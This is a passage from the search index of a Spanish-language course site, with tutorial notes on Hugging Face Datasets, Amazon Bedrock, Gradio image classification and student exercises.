dataset.to_json(f\"squad_{split}.jsonl\")\n</code></pre>","tags":["HuggingFace"]},{"location":"bedrock/datasets_aitor/#publicando","title":"Publicando","text":"<p>Pues una vez hemos creado nuestro Dataset y lo hemos persistido en disco, el \u00fanico paso que nos queda es publicar en Hugging Face. Para ello, en vez de subir los archivos a mano como hicimos en la sesi\u00f3n inicial desde el interfaz web o hacer uso de Git y copiar los archivos, desde Python es mucho m\u00e1s c\u00f3modo.</p> <p>Previamente debemos realizar login para autenticarnos, tal como vimos en la secci\u00f3n de Login de la sesi\u00f3n anterior y usar nuestro token de acceso (en este caso, necesitamos que nuestro token sea de escritura):</p> <pre><code>hf auth login\n</code></pre> <p>Login desde un cuaderno Jupyter / Colab</p> <p>Si trabajamos con un cuaderno de Jupyter o Colab, podemos utilizar la librer\u00eda de huggingface_hub y al ejecutarlo, nos aparecer\u00e1 una ventana donde introducir el token de acceso:</p> <pre><code>from huggingface_hub import login\nlogin()\n</code></pre> <p> Login desde un notebook </p> <p>Tambi\u00e9n podemos hacer uso de la variable de entorno <code>HF_TOKEN</code> para almacenar el token de acceso, ya sea con un Space almacen\u00e1ndolo en un secret de Spaces o en claves privadas de Google Colab.</p> <p>Una vez autenticado, es tan sencillo como usar el m\u00e9todo <code>push_to_hub()</code> (si queremos publicar el dataset como privado, le a\u00f1adimos el par\u00e1metro <code>private=True</code>):</p> <pre><code>midataset.push_to_hub(\"aitor-medrano/midatasetpushed\")\n# midataset.push_to_hub(\"aitor-medrano/midatasetpushed\", private=True)\n</code></pre> <p>Si tuvi\u00e9ramos diferentes splits podr\u00edamos hacer:</p> <pre><code>train_dataset.push_to_hub(\"aitor-medrano/midatasetpushed\", split=\"train\")\nval_dataset.push_to_hub(\"aitor-medrano/midatasetpushed\", split=\"validation\")\n</code></pre> <p>Creando el dataset card</p> <p>Para crear el dataset card, podemos emplear la aplicaci\u00f3n https://huggingface.co/spaces/huggingface/datasets-tagging que facilita rellenar los campos e incluye recomendaciones de otros datasets.</p> <p>Tambi\u00e9n se recomienda leer la Dataset Card Creation Guide</p>","tags":["HuggingFace"]},{"location":"bedrock/datasets_aitor/#datasets-multimedia","title":"Datasets multimedia","text":"<p>Si nuestro dataset va a contener elementos multimedia con im\u00e1genes o audios, podemos subir los archivos en crudo, lo cual es lo m\u00e1s practico en la mayor\u00eda de los casos. Si los dataset de im\u00e1genes o audios son muy grandes, se recomienda el formato WebDataset, aunque lo m\u00e1s normal, es almacenar el dataset en formato Parquet.</p> <p>Dicho esto, vamos a ver como trabajar con datasets que contienen elementos multimedia.</p>","tags":["HuggingFace"]},{"location":"bedrock/datasets_aitor/#audios","title":"Audios","text":"<p>Para trabajar con audios, necesitaremos instalar las librer\u00edas de audio:</p> <pre><code>pip install datasets[audio]\n</code></pre> <p>Una vez instalado, vamos a cargar un dataset que contiene audios, como es PolyAI/minds14:</p> <pre><code>from datasets import load_dataset\n\nminds = load_dataset(\"PolyAI/minds14\", name=\"es-ES\", split=\"train\")\nprint(minds)\n# Dataset({\n#     features: ['path', 'audio', 'transcription', 'english_transcription', 'intent_class', 'lang_id'],\n#     num_rows: 486\n# })\n</code></pre> <p>El dataset contiene 486 archivos de audio, cada uno de los cuales va acompa\u00f1ado de una transcripci\u00f3n, una traducci\u00f3n al ingl\u00e9s y una etiqueta que indica la intenci\u00f3n de la consulta de la persona. La columna de audio contiene los datos de audio sin procesar. Veamos uno de los ejemplos:</p> <pre><code>{'path': '/home/jupyter-iabd/.cache/huggingface/datasets/downloads/extracted/a809f65b01ef0d5806ac705a72b9ca382622a5c03d9a17adf1ee73de4591650b/es-ES~APP_ERROR/60266571dc3604f481bcb50a.wav',\n 'audio': {'path': '/home/jupyter-iabd/.cache/huggingface/datasets/downloads/extracted/a809f65b01ef0d5806ac705a72b9ca382622a5c03d9a17adf1ee73de4591650b/es-ES~APP_ERROR/60266571dc3604f481bcb50a.wav',\n    'array': array([ 0.        ,  0.        ,  0.        , ...,  0.        ,\n            -0.00024414, -0.00024414]),\n    'sampling_rate': 8000\n },\n 'transcription': 'hola buenas a ver tengo un problema con vuestra aplicaci\u00f3n resulta que quiero hacer una transferencia bancaria a una cuenta conocida',\n 'english_transcription': 'hello good to see I have a problem with your application it turns out that I want to make a bank transfer to a known account',\n 'intent_class': 2,\n 'lang_id': 5}\n</code></pre> <p>Si nos centramos en el campo <code>audio</code>, vemos como contiene diferentes valores, los cuales forman parte de un objeto <code>Audio</code>:</p> <ul> <li><code>path</code>: ruta al archivo de audio (en este ejemplo <code>*.wav</code>).</li> <li><code>array</code>: los datos del audio decodificados, representados por un array de NumPy</li> <li><code>sampling_rate</code>: la frecuencia de muestreo (8,000 Hz).</li> </ul> <pre><code>ejemplo = minds.shuffle()[0]\n\nid2label = minds.features[\"intent_class\"].int2str\nlabel = id2label(ejemplo[\"intent_class\"])\n</code></pre> <p>Y si queremos escuchar el audio, usando Gradio podemos crear un componente:</p> <pre><code> with gr.Blocks() as demo:\n    with gr.Column():\n        gr.Audio(audio[\"path\"], label=label)\ndemo.launch(share=True)\n</code></pre> <p>Y reproducir el audio seleccionado:</p> Reproduciendo un audio desde Gradio <p>Finalmente, si queremos mostrar un gr\u00e1fico con el espectograma del audio, y haciendo uso de la librer\u00eda Librosa:</p> <pre><code>import librosa\nimport matplotlib.pyplot as plt\nimport librosa.display\n\narray = ejemplo[\"audio\"][\"array\"]\nsampling_rate = ejemplo[\"audio\"][\"sampling_rate\"]\n\nplt.figure().set_figwidth(12)\nlibrosa.display.waveshow(array, sr=sampling_rate)\n</code></pre> <p>Obteniendo:</p> Representaci\u00f3n gr\u00e1fica de un audio","tags":["HuggingFace"]},{"location":"bedrock/datasets_aitor/#creando-un-dataset-desde-python","title":"Creando un dataset desde Python","text":"<p>Si queremos crear un dataset a partir de audios propios, necesitamos crear un diccionario o una lista con la ruta a nuestros audios, y a continuaci\u00f3n, llamar al m\u00e9todo <code>cast_column</code> para transformar la columna a tipo <code>Audio</code> con las caracter\u00edsticas que hemos visto antes.</p> <p>As\u00ed pues, si tenemos los datos en un diccionario podemos hacer:</p> <pre><code>audio_dataset = Dataset.from_dict({\"audio\": [\"path/to/audio_1\", \"path/to/audio_2\", ..., \"path/to/audio_n\"]}).cast_column(\"audio\", Audio())\n</code></pre>","tags":["HuggingFace"]},{"location":"bedrock/datasets_aitor/#audiofolder","title":"Audiofolder","text":"<p>Otra posibilidad es crear el dataset a partir de una carpeta con todos los audios, y un archivo <code>metadata.csv</code> con los datos:</p> <pre><code>folder/train/metadata.csv\nfolder/train/first_audio_file.mp3\nfolder/train/second_audio_file.mp3\nfolder/train/third_audio_file.mp3\n</code></pre> <p>Y un archivo de metadatos con:</p> metadata.csv<pre><code>file_name,transcription\nfirst_audio_file.mp3,este es el texto del primer audio\nsecond_audio_file.mp3,en el segundo audio cuento un chiste\nthird_audio_file.mp3,y en este audio agradezco al p\u00fablico sus abucheos\n</code></pre> <p>Y a continuaci\u00f3n, indicamos como primer par\u00e1metro <code>autofolder</code> y con <code>data_dir</code> indicamos la carpeta que contiene los audios:</p> <pre><code>from datasets import load_dataset\n\ndataset = load_dataset(\"audiofolder\", data_dir=\"/path/to/folder\")\n</code></pre>","tags":["HuggingFace"]},{"location":"bedrock/datasets_aitor/#referencias","title":"Referencias","text":"<ul> <li>Documentaci\u00f3n oficial de dataset</li> <li>El cap\u00edtulo La librer\u00eda Dataset del curso NLP de Hugging Face.</li> </ul>","tags":["HuggingFace"]},{"location":"bedrock/datasets_aitor/#actividades","title":"Actividades","text":"<ol> <li> <p>(RAPIA.3 / CEPIA.3b, CEPIA.3c / 2.5p) Siguiendo el ejemplo inicial trabajado en la sesi\u00f3n y s\u00f3lo empleando Python:</p> <ol> <li>Descarga los datos de SquadES considerando que los datos remotos son los de entrenamiento y validaci\u00f3n.</li> <li>Con lo datos de entrenamiento, div\u00eddelos en entrenamiento y pruebas.</li> <li>Tras ello, sobre el dataset de entrenamiento, a\u00f1ade una columna a los datos de entrenamiento con la cantidad de p\u00e1rrafos.</li> <li>Filtra los datos de entrenamiento para que el dataset s\u00f3lo contenga aquellos registros que tienen m\u00e1s de 10 p\u00e1rrafos.</li> <li>Elimina la columna con la cantidad de p\u00e1rrafos.</li> <li>Persiste todo el dataset en formato Parquet.</li> <li>Finalmente, publ\u00edcalo en Hugging Face, editando la tarjeta y poniendo un documento de ejemplo en la documentaci\u00f3n.</li> </ol> </li> <li> <p>(RAPIA.3 / CEPIA.3b, CEPIA.3c / 0.5p) Carga en streaming el dataset de imagenet-1k, y muestra la etiqueta de los primeros 5 elementos.</p> </li> <li> <p>(RAPIA.3 / CEPIA.3b, CEPIA.3c / 1p) Tenemos un dataset con informaci\u00f3n sobre vuelos retrasados en Espa\u00f1a y otro con informaci\u00f3n general sobre los aeropuertos. Se pide:</p> <ol> <li>Une ambos datasets para que la informaci\u00f3n de los vuelos contengan el nombre y la ciudad de los aeropuertos.</li> <li>Persiste los datos (sin elementos repetidos) en un dataset en formato Arrow.</li> <li>Publ\u00edcalo en Hugging Face.</li> </ol> </li> <li> <p>(RAPIA.3 / CEPIA.3b, CEPIA.3c / opcional ) Sobre la base de datos de MongoDB de <code>sample_training</code> disponible en los datos de muestra de MongoAtlas:</p> <ol> <li>Carga los de estados de <code>states.js</code>.</li> <li>Realiza una join entre las colecciones <code>zips</code> y <code>states</code>.</li> <li>Persiste los datos (sin elementos repetidos) en un dataset en formato JSON.</li> <li>Publ\u00edcalo en Hugging Face.</li> </ol> </li> </ol>","tags":["HuggingFace"]},{"location":"bedrock/sesion1/","title":"\ud83d\udcd8 Material Docente: Amazon Bedrock","text":""},{"location":"bedrock/sesion1/#objetivos","title":"Objetivos:","text":"<ul> <li>Comprender qu\u00e9 es Amazon Bedrock, sus funcionalidades principales y su prop\u00f3sito.</li> <li>Explorar los conceptos de \u201cmodelos fundacionales\u201d (FMs), \u201cRAG\u201d (generaci\u00f3n aumentada por recuperaci\u00f3n), \u201cfine-tuning\u201d y \u201cguards / guardrails\u201d para IA responsable.</li> <li>Formular hip\u00f3tesis sobre c\u00f3mo una empresa (hotel, restaurante, ...) o centros educativos, ayuntamientos, etc\u00e9tera podr\u00edan beneficiarse de IA generativa.</li> <li>Dise\u00f1ar, en equipo, una propuesta de aplicaci\u00f3n concreta usando Amazon Bedrock adaptada a un caso real.</li> </ul>"},{"location":"bedrock/sesion1/#1-introduccion-a-amazon-bedrock","title":"1. Introducci\u00f3n a Amazon Bedrock","text":"<p>Amazon Bedrock es un servicio de AWS que permite a los desarrolladores construir aplicaciones generativas utilizando modelos fundacionales (FMs) sin necesidad de gestionar infraestructura. Ofrece acceso a modelos como Claude (Anthropic), Titan (Amazon) y Stable Diffusion (Stability AI).</p>"},{"location":"bedrock/sesion1/#capacidades-destacadas","title":"Capacidades destacadas","text":"<ul> <li>RAG (Retrieval-Augmented Generation): podemos conectar Bedrock a nuestras propias fuentes de datos (documentos, bases de conocimiento) de modo que las respuestas del modelo est\u00e9n informadas por datos reales de nuestra empresa. Esto ayuda a responder consultas concretas basadas en informaci\u00f3n actualizada.  Amazon Web Services, Inc. </li> <li>Fine-tuning / personalizaci\u00f3n privada: es posible adaptar un modelo para tareas espec\u00edficas o para un dominio concreto (por ejemplo, hoteler\u00eda, turismo, restaurante, etc.), usando nuestros propios datos, sin que esos datos entren a formar parte del modelo base. </li> <li>Seguridad, privacidad e IA responsable: Bedrock integra funcionalidades de protecci\u00f3n, guardrails, control de contenidos y privacidad de datos, para reducir riesgos \u2014 por ejemplo, filtrado de contenido inapropiado, protecci\u00f3n de datos, auditor\u00eda\u2026 </li> <li>Flexibilidad de modelos: podemos elegir entre muchos FMs de distintos proveedores seg\u00fan el uso: algunos ser\u00e1n mejores para generaci\u00f3n de texto creativa; otros para respuestas precisas; otros para integraci\u00f3n con datos. </li> </ul>"},{"location":"bedrock/sesion1/#que-es-retrieval-augmented-generation-rag-o-generacion-aumentada-por-recuperacion","title":"\u00bfQu\u00e9 es \"Retrieval Augmented Generation\" (RAG) o Generaci\u00f3n Aumentada por Recuperaci\u00f3n ?","text":"<p>La \"Retrieval Augmented Generation\" (RAG) o Generaci\u00f3n Aumentada por Recuperaci\u00f3n en espa\u00f1ol es una t\u00e9cnica de IA que combina dos componentes: un sistema de recuperaci\u00f3n de informaci\u00f3n y un modelo de lenguaje grande (LLM). El objetivo es mejorar la precisi\u00f3n y la actualidad de las respuestas del LLM al permitirle acceder y utilizar informaci\u00f3n de fuentes de datos externas y espec\u00edficas antes de generar su respuesta, sin necesidad de reentrenamiento. </p>"},{"location":"bedrock/sesion1/#como-funciona","title":"C\u00f3mo funciona","text":"<ol> <li>Recuperaci\u00f3n: Cuando se hace una consulta, un sistema de recuperaci\u00f3n busca y selecciona los fragmentos de informaci\u00f3n m\u00e1s relevantes de una base de conocimiento externa (que puede incluir documentos privados, bases de datos o fuentes de noticias).</li> <li>Generaci\u00f3n: El modelo de lenguaje grande (LLM) toma la consulta original junto con la informaci\u00f3n recuperada para generar una respuesta m\u00e1s precisa, actualizada y contextualizada.</li> <li>Ejemplo: Si un usuario pregunta sobre un producto espec\u00edfico, el sistema RAG puede buscar en la base de datos de la empresa informaci\u00f3n sobre ese producto y luego usarla para que el LLM genere una respuesta detallada y precisa. </li> </ol>"},{"location":"bedrock/sesion1/#beneficios-de-rag","title":"Beneficios de RAG","text":"<ul> <li>Acceso a datos actualizados: Permite a los LLM acceder a informaci\u00f3n m\u00e1s reciente que la que ten\u00edan durante su entrenamiento inicial.</li> <li>Reducci\u00f3n de \"alucinaciones\": Disminuye la probabilidad de que el modelo \"invente\" informaci\u00f3n, ya que se basa en datos concretos.</li> <li>Adaptaci\u00f3n a dominios espec\u00edficos: Facilita la creaci\u00f3n de chatbots o aplicaciones que pueden responder preguntas sobre temas muy espec\u00edficos o propietarios, como el conocimiento interno de una empresa.</li> <li>Referencia de fuentes: Puede citar las fuentes de informaci\u00f3n utilizadas, lo que aumenta la transparencia y la confianza en las respuestas.</li> <li>Eficiencia: Es una forma m\u00e1s r\u00e1pida y econ\u00f3mica de actualizar la informaci\u00f3n de un LLM en comparaci\u00f3n con el reentrenamiento completo del modelo. </li> </ul> <p>M\u00e1s informaci\u00f3n en este v\u00eddeo</p>"},{"location":"bedrock/sesion1/#ventajas","title":"Ventajas","text":"<ul> <li>Sin necesidad de entrenar modelos desde cero.</li> <li>Integraci\u00f3n nativa con servicios AWS.</li> <li>Escalabilidad y seguridad empresarial.</li> </ul>"},{"location":"bedrock/sesion1/#casos-de-uso","title":"Casos de uso","text":"<ul> <li>Chatbots inteligentes.</li> <li>Generaci\u00f3n de contenido.</li> <li>Res\u00famenes autom\u00e1ticos.</li> <li>Recuperaci\u00f3n aumentada (RAG).</li> </ul>"},{"location":"bedrock/sesion1/#ejemplos-clave-de-uso-de-bedrock","title":"\ud83d\udca1 Ejemplos Clave de Uso de Bedrock","text":"\u00c1rea de Uso Descripci\u00f3n Modelo Fundacional T\u00edpico Generaci\u00f3n de Contenido Crear art\u00edculos, descripciones de productos o scripts autom\u00e1ticamente. Amazon Titan Text, Anthropic Claude B\u00fasqueda y Resumen Crear chatbots que responden preguntas bas\u00e1ndose en documentos internos (patrones RAG). Amazon Titan Embeddings, Meta Llama 2 Automatizaci\u00f3n de Agentes Construir agentes de IA que pueden realizar tareas complejas de varios pasos (ej. procesar reclamaciones). Agents for Amazon Bedrock (usando modelos como Claude) Generaci\u00f3n de C\u00f3digo Asistencia para desarrolladores que genera fragmentos de c\u00f3digo, traduce lenguajes o explica funciones. Anthropic Claude Code"},{"location":"bedrock/sesion1/#ejemplo-ilustrativo","title":"Ejemplo ilustrativo","text":"<p>Imagina que tienes un hotel y quieres ofrecer a tus clientes un \u201casistente inteligente\u201d (chatbot) que: - Responda preguntas frecuentes: horarios, servicios, recomendaciones locales. - Sugiera experiencias seg\u00fan perfil del cliente (familia, pareja, negocios, con mascotas). - Responda en varios idiomas.</p> <p>Con Amazon Bedrock podr\u00edamos: - Crear una base de conocimiento con informaci\u00f3n propia del hotel: descripciones de servicios, normas, tarifas, actividades, recomendaciones locales. - Usar RAG (Retrieval-Augmented Generation) para que el modelo \u201cse base\u201d en esa informaci\u00f3n interna cuando responda. - Si queremos precisi\u00f3n en el estilo de las respuestas (por ejemplo, tono amable, cercano, profesional), har\u00edamos un fine-tuning con ejemplos de interacciones t\u00edpicas. - Publicar ese asistente como chatbot web, Bot de Telegram, WhatsApp o similar, sin tener que disponer de servidores propios: Bedrock lo gestiona.</p>"},{"location":"bedrock/sesion1/#2-requisitos-previos","title":"2. Requisitos previos","text":"<ul> <li>Cuenta activa en AWS.</li> <li>Permisos IAM para Amazon Bedrock.</li> <li>SDK de AWS (Python o Node.js).</li> <li>Activaci\u00f3n de modelos en la consola.</li> </ul>"},{"location":"bedrock/sesion1/#3-parametros-de-inferencia-y-experimentacion","title":"3. Par\u00e1metros de Inferencia y Experimentaci\u00f3n","text":"<p>Los alumnos deben experimentar con las configuraciones del prompt para controlar el comportamiento del modelo.</p> Par\u00e1metro Descripci\u00f3n Impacto en el resultado Temperatura Controla la creatividad y la diversidad de las respuestas. Un valor superior genera respuestas m\u00e1s creativas y diversas. P Superior (Top P) Permite seleccionar palabras m\u00e1s probables. Permite variar entre respuestas m\u00e1s probables o menos probables. Longitud M\u00e1xima (MaxTokenCount) Define el tama\u00f1o m\u00e1ximo de la respuesta generada. Limita el coste y la extensi\u00f3n de la respuesta."},{"location":"bedrock/sesion1/#4-eleccion-estrategica-del-modelo","title":"4. Elecci\u00f3n estrat\u00e9gica del modelo","text":"<p>Amazon Bedrock ofrece flexibilidad para elegir el modelo que mejor se adapte a cada necesidad. - Modelos de Amazon (Titan/Nova): Modelos propietarios que ofrecen inteligencia multimodal r\u00e1pida y rentable, incluyendo generaci\u00f3n de texto, im\u00e1genes, comprensi\u00f3n de documentos y c\u00f3digo. El modelo Nova Lite es multimodal y sensible a los costes, mientras que Nova Pro es competente para tareas m\u00e1s complejas. Los modelos Titan Text Express son recomendados para tareas de alto volumen y bajo coste como el resumen. - Anthropic (Claude): Modelos que destacan en razonamiento complejo, generaci\u00f3n de c\u00f3digo y seguimiento de instrucciones, adecuados para industrias que exigen cumplimiento y confianza. - Stability AI: Conocidos por sus modelos de generaci\u00f3n de im\u00e1genes, como Stable Diffusion 3.5 Large. - DeepSeek: Modelos avanzados de razonamiento que resuelven problemas complejos paso a paso. - Mistral AI: Modelos especializados para el razonamiento agentic y tareas multimodales.</p>"},{"location":"bedrock/sesion1/#ejemplo-basico-generar-texto-con-claude","title":"Ejemplo b\u00e1sico: Generar texto con Claude","text":"<p>C\u00f3digo en Python usando boto3:</p> <pre><code>import boto3\n\nclient = boto3.client('bedrock-runtime', region_name='us-east-1')\n\nprompt = \"Resume en 3 puntos las ventajas de Amazon Bedrock\"\nresponse = client.invoke_model(\n    modelId=\"anthropic.claude-v2\",\n    body={\"input\": prompt}\n)\n\nprint(response['body'])\n</code></pre>"},{"location":"bedrock/sesion1/#5-aprendizaje-basado-en-retos","title":"5. Aprendizaje basado en retos","text":""},{"location":"bedrock/sesion1/#reto-1","title":"\u2705 Reto 1","text":"<p>Crear un prompt que genere un plan de marketing para un producto tecnol\u00f3gico.</p>"},{"location":"bedrock/sesion1/#reto-2","title":"\u2705 Reto 2","text":"<p>Implementar un flujo con Bedrock Agents para responder preguntas sobre documentos internos.</p>"},{"location":"bedrock/sesion1/#reto-3","title":"\u2705 Reto 3","text":"<p>Conectar Bedrock con Amazon S3 para usar datos propios en la generaci\u00f3n de respuestas.</p>"},{"location":"bedrock/sesion1/#6-proyecto-integrador-real","title":"6. Proyecto integrador real","text":""},{"location":"bedrock/sesion1/#caso","title":"Caso","text":"<p>Automatizar res\u00famenes de informes t\u00e9cnicos en una empresa manufacturera.</p>"},{"location":"bedrock/sesion1/#arquitectura","title":"Arquitectura","text":"<ul> <li>AWS Lambda + API Gateway + Amazon Bedrock.</li> </ul>"},{"location":"bedrock/sesion1/#flujo","title":"Flujo","text":"<ol> <li>T\u00e9cnico sube informe a S3.</li> <li>Lambda invoca Bedrock para generar resumen.</li> <li>API Gateway expone endpoint para consultar resumen.</li> </ol>"},{"location":"bedrock/sesion1/#codigo-lambda-python","title":"C\u00f3digo Lambda (Python)","text":"<pre><code>import json\nimport boto3\n\ndef lambda_handler(event, context):\n    client = boto3.client('bedrock-runtime')\n    report_text = event['body']\n\n    response = client.invoke_model(\n        modelId=\"anthropic.claude-v2\",\n        body={\"input\": f\"Resume el siguiente informe t\u00e9cnico: {report_text}\"}\n    )\n\n    return {\n        'statusCode': 200,\n        'body': json.dumps({'summary': response['body']})\n    }\n</code></pre>"},{"location":"bedrock/sesion1/#resultado-esperado","title":"Resultado esperado","text":"<ul> <li>Endpoint <code>/summarize</code> devuelve resumen en segundos.</li> <li>Beneficio: reduce tiempo de an\u00e1lisis en un 70%.</li> </ul>"},{"location":"bedrock/sesion1/#7-recursos-adicionales","title":"7. Recursos adicionales","text":"<ul> <li>Documentaci\u00f3n oficial</li> <li>Gu\u00eda r\u00e1pida AWS</li> </ul>"},{"location":"hf/","title":"Apuntes y ejercicios pr\u00e1cticas del curso de especializaci\u00f3n en Inteligencia Artificial y Big Data","text":"<p>Apuntes, pr\u00e1cticas y ejercicios del curso de especializaci\u00f3n en Inteligencia Artificial y Big Data en el IES Severo Ochoa (Elche).</p> <p>Los ejercicios y conocimientos contenidos en las pr\u00e1cticas y/o apuntes de  todos los m\u00f3dulos tienen exclusivamente prop\u00f3sito formativo, por lo que  nunca se deber\u00e1n utilizar con fines maliciosos o delictivos.</p> <p>Ning\u00fan alumno o alumna de este curso, ni profesor o profesora como  docentes, ser\u00e1n responsables de los da\u00f1os directos o indirectos que  pudieran derivarse del uso inadecuado de las herramientas y mecanismos  expuestos.</p>"},{"location":"hf/Actividades/","title":"Actividades","text":""},{"location":"hf/Actividades/#actividades","title":"Actividades","text":"<ol> <li>Estimaci\u00f3n de profundidad Utiliza el pipeline:</li> </ol> <pre><code>from transformers import pipeline\n\ndepth = pipeline(\"depth-estimation\", model=\"Intel/zoedepth-nyu-kitti\")\n\nresult = depth(\"ruta_o_url_imagen\")\n</code></pre> <ol> <li> <p>Clasificaci\u00f3n de im\u00e1genes Usa el pipeline: <pre><code>from transformers import pipeline\nclassifier = pipeline(\"image-classification\")\nres = classifier(\"ruta_o_url_imagen\")\n\nprint(res)\n</code></pre></p> </li> <li> <p>Avanzado (Optativo): Integrar clasificaci\u00f3n y segmentaci\u00f3n </p> </li> </ol> <p>Ejecuta ambos pipelines y visualiza el resultado conjunto.</p>"},{"location":"hf/Datasets/","title":"\ud83d\udcd8 Hugging Face Datasets: Gu\u00eda + Reto Gamificado","text":""},{"location":"hf/Datasets/#1-introduccion","title":"1\ufe0f\u20e3 Introducci\u00f3n","text":"<p>El paquete <code>datasets</code> de Hugging Face es una potente herramienta para acceder, compartir y procesar conjuntos de datos (datasets) de IA para una amplia gama de tareas, que incluyen:</p> <ul> <li>Procesamiento del Lenguaje Natural (PLN)</li> <li>Visi\u00f3n por computadora</li> <li>Procesamiento de audio</li> </ul> <p>Est\u00e1 dise\u00f1ado para manejar grandes vol\u00famenes de datos de manera eficiente mediante el uso de mapeo de memoria y el formato Apache Arrow, lo que permite trabajar con datos que superan la RAM disponible.</p> <p>Arrow Apache Arrow define un formato de memoria columnar independiente del lenguaje para datos planos y anidados, organizado para operaciones anal\u00edticas eficientes en hardware moderno como CPU y GPU. El formato de memoria Arrow tambi\u00e9n admite lecturas sin copia para un acceso a datos ultrarr\u00e1pido sin sobrecarga de serializaci\u00f3n.</p> <p>El proyecto del formato Apache Arrow comenz\u00f3 en febrero de 2016, centr\u00e1ndose en cargas de trabajo de an\u00e1lisis columnar en memoria. A diferencia de formatos de archivo como Parquet o CSV, que especifican c\u00f3mo se organizan los datos en el disco, Arrow se centra en c\u00f3mo se organizan los datos en la memoria.</p> <p>Los creadores buscan consolidar Arrow como un formato est\u00e1ndar en memoria para el an\u00e1lisis de cargas de trabajo. Estos fundamentos atraen a numerosos colaboradores de proyectos como Pandas, Spark, Cassandra, Apache Calcite, Dremio e Ibis.</p>"},{"location":"hf/Datasets/#caracteristicas-clave","title":"\ud83d\udd11 Caracter\u00edsticas Clave","text":"<ul> <li>Vasto Repositorio (Hub): Gran cantidad de datasets p\u00fablicos y privados.</li> <li>F\u00e1cil Acceso: Carga en una sola l\u00ednea de c\u00f3digo.</li> <li>Procesamiento Eficiente: M\u00e9todos como <code>map()</code> paralelizados.</li> <li>Escalabilidad: Objetos <code>Dataset</code> y <code>IterableDataset</code>.</li> <li>Gesti\u00f3n de Datos: Crear y subir datasets propios al Hub.</li> </ul>"},{"location":"hf/Datasets/#instalacion","title":"\u2699\ufe0f Instalaci\u00f3n","text":"<pre><code>pip install datasets\npip install datasets[audio]\npip install datasets[vision]\n</code></pre>"},{"location":"hf/Datasets/#ejemplo-cargar-un-dataset-local","title":"\ud83e\udde9 Ejemplo: Cargar un dataset local","text":"<pre><code>from datasets import load_dataset\n\nsquad_dataset = load_dataset(\"json\", data_files=\"train-v2.0-es.json\", field=\"data\")\n\nprint(squad_dataset)\n</code></pre> <p>Salida esperada: <pre><code>DatasetDict({\n    train: Dataset({ features: ['title', 'paragraphs'], num_rows: 442 })\n})\n</code></pre></p>"},{"location":"hf/Datasets/#2-reto-gamificado-publica-tu-primer-dataset-en-hugging-face","title":"2\ufe0f\u20e3 Reto Gamificado: Publica tu primer Dataset en Hugging Face","text":""},{"location":"hf/Datasets/#objetivo","title":"\ud83c\udfaf Objetivo","text":"<p>Aprender a trabajar con datasets en Hugging Face, realizar transformaciones y publicar un dataset en el Hugging Face Hub.</p>"},{"location":"hf/Datasets/#niveles-del-reto","title":"\ud83d\udd79\ufe0f Niveles del reto","text":"<ol> <li>Descarga y explora: Cargar <code>SquadES</code>.</li> <li>Divide en train/test: Crear split adicional.</li> <li>A\u00f1ade columna: <code>num_paragraphs</code>.</li> <li>Filtra y persiste: Guardar en Parquet.</li> <li>Publica en Hugging Face: A\u00f1adir documentaci\u00f3n.</li> </ol>"},{"location":"hf/Datasets/#plantilla-del-ejercicio","title":"\ud83d\udcc2 Plantilla del ejercicio","text":"<pre><code>from datasets import load_dataset\n\n# Nivel 1: Descargar y explorar\ndataset = load_dataset(\"PlanTL-GOB-ES/squad-es\")\nprint(dataset)\n\n# Nivel 2: Dividir en train/test\ntrain_dataset = dataset[\"train\"]\nsplit_dataset = train_dataset.train_test_split(test_size=0.2)\ntrain_split = split_dataset[\"train\"]\ntest_split = split_dataset[\"test\"]\n\n# Nivel 3: A\u00f1adir columna con cantidad de p\u00e1rrafos\ndef add_num_paragraphs(example):\n    return {\"num_paragraphs\": len(example[\"paragraphs\"])}\ntrain_split = train_split.map(add_num_paragraphs)\n\n# Nivel 4: Filtrar y persistir\nfiltered_train = train_split.filter(lambda x: x[\"num_paragraphs\"] &gt; 10)\nfiltered_train = filtered_train.remove_columns([\"num_paragraphs\"])\nfiltered_train.to_parquet(\"filtered_train.parquet\")\n\n# Nivel 5: Publicar en Hugging Face\n# filtered_train.push_to_hub(\"usuario/nombre-dataset\")\n</code></pre>"},{"location":"hf/Datasets/#recursos","title":"\ud83d\udd17 Recursos","text":"<ul> <li>Hugging Face Datasets</li> <li>Documentaci\u00f3n oficial</li> </ul>"},{"location":"hf/Ejemplo_gradio/","title":"Aplicaci\u00f3n web Gradio + Modelo previamente entrenado","text":"<p>Vamos a crear una aplicaci\u00f3n web con Gradio que use el modelo creado en una sesi\u00f3n anterior: \u200bomarques/autotrain-dogs-and-cats-1527055142</p> <p>Ejemplo de aplicaci\u00f3n Gradio con una imagen de entrada y un Label como componente de salida: </p> <p>Etiquetado de la imagen de entrada: </p>"},{"location":"hf/Ejemplo_gradio/#codigo-de-ejemplo","title":"C\u00f3digo de ejemplo","text":"<pre><code>import gradio as gr\u200b\n\u200b\ndef image_classifier(inp):\u200b\n\u2003 return {'cat': 0.3, 'dog': 0.7}\u200b\n\ndemo = gr.Interface(fn=image_classifier, inputs='image', outputs='label')\u200b\n\ndemo.launch()\u200b\n</code></pre>"},{"location":"hf/Ejemplo_gradio/#anadimos-el-modelo","title":"A\u00f1adimos el modelo","text":"<pre><code>import gradio as gr\u200b\nfrom transformers import pipeline\u200b\n\u200b\ndef image_classifier(inp):\u200b\n   pipe = pipeline(\"image-classification\", model=\"omarques/autotrain-dogs-and-cats-1527055142\")\u200b\n   pipe(\"https://huggingface.co/datasets/huggingface/documentation-images/resolve/main/hub/parrots.png\")\u200b\n   return {'cat': 0.3, 'dog': 0.7}\u200b\n\u200b\ndemo = gr.Interface(fn=image_classifier, inputs='image', outputs='label')\u200b\n\n\u200bdemo.launch()\u200b\n</code></pre>"},{"location":"hf/Ejemplo_gradio/#instalamos-las-librerias-transformers-y-torch","title":"Instalamos las librer\u00edas transformers y torch\u200b","text":"<p><pre><code>pip install transformers torch\u200b\n</code></pre> Volvemos a probar y comprobamos que funciona correctamente.</p> <p>Dentro del componente Image, por defecto Gradio pasa un objeto tipo <code>numpy.ndarray</code> (la imagen como matriz) a las funciones de Gradio, por lo que debemos especificar el tipo con <code>gr.Image(type=\"filepath\")</code> en la creaci\u00f3n de la interfaz de Gradio\u200b. \u200b</p>"},{"location":"hf/Ejemplo_gradio/#especificar-el-tipo-en-image","title":"Especificar el tipo en Image","text":"<pre><code>demo = gr.Interface(fn=image_classifier, inputs=gr.Image(type=\"filepath\"), outputs='label')\u200b\n</code></pre>"},{"location":"hf/Ejemplo_gradio/#codigo-actualizado","title":"C\u00f3digo actualizado","text":"<pre><code>import gradio as gr\u200b\nfrom transformers import pipeline\u200b\n\ndef image_classifier(inp):\u200b\n   